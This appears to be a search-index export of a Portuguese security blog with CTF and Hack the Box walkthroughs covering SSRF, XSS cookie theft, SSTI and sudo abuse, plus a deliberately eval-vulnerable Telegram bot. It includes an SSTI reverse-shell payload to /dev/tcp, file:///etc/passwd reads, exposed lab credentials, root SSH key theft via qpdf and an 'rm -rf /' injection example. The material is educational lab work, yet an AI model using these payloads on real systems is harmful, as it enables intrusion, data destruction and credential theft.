[{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/authors/edson/","section":"Authors","summary":"","title":"Edson"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/","section":"Sunsec","summary":"","title":"Sunsec"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":" CTF Doryl # Como acessar o desafio: # Acesse o https://github.com/fguisso/doryl-site-check, e inicie o desafio na sua m√°quina. No caso foi entregue a vers√£o na branch Internal. Descri√ß√£o # O Desafio tem como objetivos:\nEncontrar um arquivo com informa√ß√µes muito sensiveis. Encontrar uma flag no formato secDevOps{\u0026hellip;..} Como Funciona a Aplica√ß√£o # A aplica√ß√£o possui apenas um campo de entrada, utilizado para escanear a url inserida: -Note que ele retorna a resposta completa da url que o usu√°rio inseriu.\nEnt√£o parece que a aplica√ß√£o internamente envia requisi√ß√µes para a url. Nesse princ√≠pio √© poss√≠vel inserir uma URL para tentar acessar servidores internos, como o http://localhost.\nUtilize as portas web mais utilizadas em um bruteforce, para saber se existe alguma porta interna aberta: 80,443,8009,8180,81,300,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017.\nUtilize o ffuf para automatizar a buscar de portas o input √© enviado no par√¢metro target para o servidor, e note que filtrei as respostas que possuem 3246 palavras que considerei como resposta padr√£o do site.\nffuf -u http://0.0.0.0:8080/check -X POST -d \u0026quot;target=http%3A%2F%2Flocalhost%3AFUZZ\u0026quot; -w ports.txt -H 'Content-Type: application/x-www-form-urlencoded' -fw 3246\nNote que ele encontrou apenas 2 portas abertas a 8080, que fornece o site principal, e a 3000, que fornece uma aplica√ß√£o interna. Analise a resposta completa, quando voc√™ insere http://localhost:3000, GET http://localhost:3000 Content-Length: 93 Content-Type: text/html; charset=utf-8 Date: Thu, 05 Sep 2024 05:46:30 GMT Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT \u0026lt;pre\u0026gt; \u0026lt;a href=\u0026#34;employers.html\u0026#34;\u0026gt;employers.html\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;logins.txt\u0026#34;\u0026gt;logins.txt\u0026lt;/a\u0026gt; \u0026lt;/pre\u0026gt; Note que ele possui um link para logins.txt, ao enviar a url http://localhost:3000/logins.txt no input, ele ir√° retornar informa√ß√µes muito sens√≠veis. GET http://localhost:3000/logins.txt Accept-Ranges: bytes Content-Length: 233 Content-Type: text/plain; charset=utf-8 Date: Thu, 05 Sep 2024 05:50:52 GMT Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT // Super sensitive information // WiFi id: Doryl password: 2022doryl@* // Guest WiFi id: Doryl-Guest password: dorylguest2022 // Intranet login: admin password: Adminqwert2022 // Ginpass login: dorylAdmin password: ginAndOrange Primeira Etapa Conclu√≠da # Encontre a FLAG # Note, o servidor envia um request interno para a url inserida, que utilizou o protocolo http. Ao saber disso podemos tentar outros protocolos comuns para acessar arquivos de um servidor interno, como o file Vamos tentar recuperar um arquivo comum em servidores linux /etc/passwd para testar se ele retornar o conte√∫do, insira no input file:///etc/passwd. GET file:///etc/passwd root‚ùå0:0:root:/root:/bin/ash bin‚ùå1:1:bin:/bin:/sbin/nologin daemon‚ùå2:2:daemon:/sbin:/sbin/nologin adm‚ùå3:4:adm:/var/adm:/sbin/nologin lp‚ùå4:7:lp:/var/spool/lpd:/sbin/nologin sync‚ùå5:0:sync:/sbin:/bin/sync shutdown‚ùå6:0:shutdown:/sbin:/sbin/shutdown halt‚ùå7:0:halt:/sbin:/sbin/halt mail‚ùå8:12:mail:/var/mail:/sbin/nologin news‚ùå9:13:news:/usr/lib/news:/sbin/nologin uucp‚ùå10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator‚ùå11:0:operator:/root:/sbin/nologin man‚ùå13:15üë®/usr/man:/sbin/nologin postmaster‚ùå14:12:postmaster:/var/mail:/sbin/nologin cron‚ùå16:16:cron:/var/spool/cron:/sbin/nologin Essa resposta, √© o conte√∫do do /etc/passwd , ent√£o podemos tentar recuperar a flag que est√° armazenada no sistema. √â comum em ctfs a flag ficar na mesma pasta do desafio e com o nome flag.txt , partindo deste princ√≠pio podemos inserir file://./flag.txt . GET file://./flag.txt SecDevOps{SSRF_3_UM_PERIGOnvim .!} Todos Objetivos foram concluidos ( ;\n|Criador do Desafio: https://github.com/fguisso\n","date":"5 September 2024","externalUrl":null,"permalink":"/posts/doryl-writeup/","section":"Posts","summary":"Resolu√ß√£o do desafio Doryl site-check","title":"Write Up - Doryl Site-Check"},{"content":" Reconhecimento # A princ√≠pio realizamos o mapeamento das portas abertas no nosso alvo, bem como seus servi√ßos e vers√µes.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) Ao tentar acessar o servidor WEB, n√≥s somos redirecionados para o dom√≠nio capiclean.htb. Dessa forma, adicionamos a seguinte linha no nosso arquivo /etc/hosts para que esse dom√≠nio consiga ser resolvido.\necho \u0026#34;10.10.11.12 capiclean.htb\u0026#34; | sudo tee -a /etc/hosts Ap√≥s acessar a aplica√ß√£o e realizarmos uma busca na aplica√ß√£o por vulnerabilidades, e nos deparamos com o endpoint \u0026ldquo; http://capiclean.htb/quote\" que trouxe uma mensagem suspeita:\nYour quote request was sent our management team. They will reach out soon via e-mail. Thanks for the interest you have shown in our services Ao ler esta mensagem, automaticamente verificamos se algum par√¢metro da request enviada para o admin, vulner√°vel a XSS, pois se fosse o caso n√≥s poder√≠amos fazer a exfiltra√ß√£o do seu token e utilizar a app com privil√©gio m√°ximo.\nUtilizamos os payload acima para enviar o token de sess√£o do admin para um servidor web que que levantamos com python utilizando o comando\npython3 -m http.server Como resultado desse processo, obtivemos o token de sess√£o do admin Acesso inicial # De posse do token, enumeramos mais alguns endpoint da aplica√ß√£o\nffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3- medium.txt:FFUZ -u http://capiclean.htb/FFUZ E encontramos o endpoint \u0026lsquo;dashboard\u0026rsquo; que tem acesso restrito. Dessa forma, adicionamos o cookie de admin no browser e conseguimos acessar o endpoint.\nSeguindo o \u0026lsquo;happy path\u0026rsquo; da aplica√ß√£o n√≥s geramos um invoice, e posteriormente tentamos acess√°-lo por meio da fun√ß√£o de gera√ß√£o de QRcode. Analisando os par√¢metros request, n√≥s identificamos um SSTI no par√¢metro \u0026lsquo;qr_link\u0026rsquo;\nUma vez que identificamos esta vulnerabilidade, n√≥s iniciamos os testes com payloads diversos para conseguir uma shell reversa. O payload a seguir foi o que nos possibilitou acessar o sistema\n{{request|attr(\u0026#34;application\u0026#34;)|attr(\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fimport\\x5f\\x5f\u0026#34;)(\u0026#34;os\u0026#34;)|attr(\u0026#34;popen\u0026#34;)(\u0026#34;bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/Nosso_IP/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)|attr(\u0026#34;read\u0026#34;)()}} Escala√ß√£o de privil√©gio # Uma vez que conseguimos executar c√≥digo na m√°quina alvo, realizamos uma varredura na em sua infraestrutura. Come√ßamos pelo c√≥digo fonte da aplica√ß√£o. Nele encontramos algumas credenciais de banco de dados:\ndb_config = { \u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;iclean\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;pxCsmnGLckUb\u0026#39;, \u0026#39;database\u0026#39;: \u0026#39;capiclean\u0026#39; } Ao verificarmos as portas abertas na aplica√ß√£o, percebeu-se que a porta 3306 estava aberta. Indicando que existe um banco MySQL em execu√ß√£o. De posse dessa informa√ß√£o utilizamos as credenciais antes encontradas no c√≥digo para assim consegui ter acesso aos dados do banco\nmysql --database capiclean -e \u0026#39;show databases;\u0026#39; -u iclean -p Ap√≥s isso, tentamos quebrar ambas as hashs e tivemos sucesso em quebrar apenas a hash do usu√°rio \u0026lsquo;consuela\u0026rsquo; que resultou na senha \u0026lsquo;simple and clean\u0026rsquo;. Com a senha e o usu√°rio foi feita a tentativa de logins via ssh.\nssh consuela@$rhost Que foi bem sucedida. Agora com a shell ssh verificamos se algum comando habilitado a ser executado com privil√©gio de sudo.\nsudo -l Ap√≥s entender do que se trata a plica√ß√£o. Fizemos a seguinte suposi√ß√£o, se o usu√°rio consuela tem ssh, o usu√°rio root tamb√©m deve ter ssh. Sendo sua chave privada armazenada no arquivo /root/.ssh/id_rsa, n√≥s poder√≠amos mandar criar um pdf com o conte√∫do da chave ssh do usu√°rio root e direcionarmos esse pdf para um diret√≥rio acess√≠vel.\nsudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa Ap√≥s a suposi√ß√£o se mostrar verdadeira, n√≥s resgatamos a chave ssh ao verificar o conte√∫do interno do pdf, n√≥s realizamos o login via root por meio do comando\nssh root@$rhost -i root_ssh_key_file Com isso n√≥s temos acesso ao usu√°rio root e podemos ver a √∫ltima flag\ncat root.txt ","date":"20 August 2024","externalUrl":null,"permalink":"/posts/htb-iclean/","section":"Posts","summary":"Resolu√ß√£o da m√°quina perfection do hack the box","title":"Hack the Box - iclean"},{"content":"","date":"20 August 2024","externalUrl":null,"permalink":"/authors/paixao/","section":"Authors","summary":"","title":"Paixao"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/appsec/","section":"Tags","summary":"","title":"Appsec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/appsec/","section":"Categories","summary":"","title":"AppSec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/authors/guisso/","section":"Authors","summary":"","title":"Guisso"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/injection/","section":"Tags","summary":"","title":"Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/injection/","section":"Categories","summary":"","title":"Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/owasp/","section":"Tags","summary":"","title":"Owasp"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/owasp/","section":"Categories","summary":"","title":"OWASP"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/pt-br/","section":"Tags","summary":"","title":"Pt-Br"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/python/","section":"Categories","summary":"","title":"Python"},{"content":" Bot do Telegram com Vulnerabilidade de Inje√ß√£o # Este projeto demonstra um bot simples do Telegram implementado em Python usando a biblioteca python-telegram-bot. O bot inclui uma vulnerabilidade na fun√ß√£o echo, que avalia qualquer entrada de texto recebida, potencialmente levando a ataques de inje√ß√£o de c√≥digo.\nExecutando o Projeto # Siga estas etapas para executar o projeto localmente:\nClone o reposit√≥rio:\ngit clone https://github.com/fguisso/python-injection Instale as depend√™ncias necess√°rias:\npip install python-telegram-bot Obtenha um Token de Bot do Telegram:\nInicie uma conversa com BotFather no Telegram. Voc√™ pode encontr√°-lo pesquisando por \u0026ldquo;@BotFather\u0026rdquo; na barra de pesquisa do Telegram ou clicando aqui. Envie o comando /newbot para iniciar o processo de cria√ß√£o de um novo bot. Siga as instru√ß√µes para escolher um nome e um username para o seu bot. Ap√≥s criar o bot, o BotFather ir√° fornecer um token. Copie esse token. Defina o Token do Bot como uma Vari√°vel de Ambiente:\nexport TOKEN_TELEGRAM=\u0026#34;seu_token_do_bot_aqui\u0026#34; Execute o script Python:\npython main.py Interaja com o bot no Telegram.\nFuncionamento do Bot # O bot est√° configurado para receber mensagens contendo opera√ß√µes matem√°ticas como entrada. Essas opera√ß√µes s√£o resolvidas no comando echo, que retorna o resultado da opera√ß√£o como resposta.\nPor exemplo, ao enviar a mensagem 2 + 2 para o bot, ele retornar√° 4. Isso pode ser √∫til para realizar c√°lculos simples diretamente no Telegram.\nExplica√ß√£o da vulnerabilidade # As vulnerabilidades de inje√ß√£o est√£o entre as principais preocupa√ß√µes de seguran√ßa de aplicativos da web. De acordo com o OWASP Top 10, a inje√ß√£o de c√≥digo (como SQL injection, XSS, Command Injection e outras) √© uma das principais amea√ßas para a seguran√ßa dos aplicativos.\nNo contexto deste bot, a vulnerabilidade de inje√ß√£o ocorre na fun√ß√£o echo, que utiliza a fun√ß√£o eval para evoluir qualquer entrada de texto recebida. Isso permite que poss√≠veis atacantes executem c√≥digo arbitr√°rio enviando uma entrada maliciosa. Exploits s√£o os c√≥digos maliciosos usados para atacar o sistemas e neste cenario estes s√£o alguns exemplos de exploits que voc√™ pode enviar para seu bot que ser√£o executados na maquina onde o seu bot esta rodando:\nMensagem para o bot Resultado do exploit os.getenv(\u0026quot;TOKEN_TELEGRAM\u0026quot;) Acesso a vari√°veis de ambiente os.system(\u0026quot;rm -rf /\u0026quot;) Execu√ß√£o de comandos do sistema operacional, no caso, rm vai deletar todos os arquivos do sistema. import malicious_module Importa√ß√£o de m√≥dulos maliciosos __import__(\u0026quot;malicious_module\u0026quot;).malicious_function() Execu√ß√£o de c√≥digo malicioso. Os usu√°rios s√£o encorajados a testar esses exploits em seu pr√≥prio bot e observar os resultados. No entanto, tenha cuidado ao usar exploits, pois eles podem causar danos ao sistema.\nDocumenta√ß√£o # python-telegram-bot Documentation Telegram Bot API Documentation Telegram BotFather Documentation OWASP Top 10 ","date":"23 March 2024","externalUrl":null,"permalink":"/posts/python-injection/","section":"Posts","summary":"","title":"Python Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/telegram/","section":"Categories","summary":"","title":"Telegram"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"}]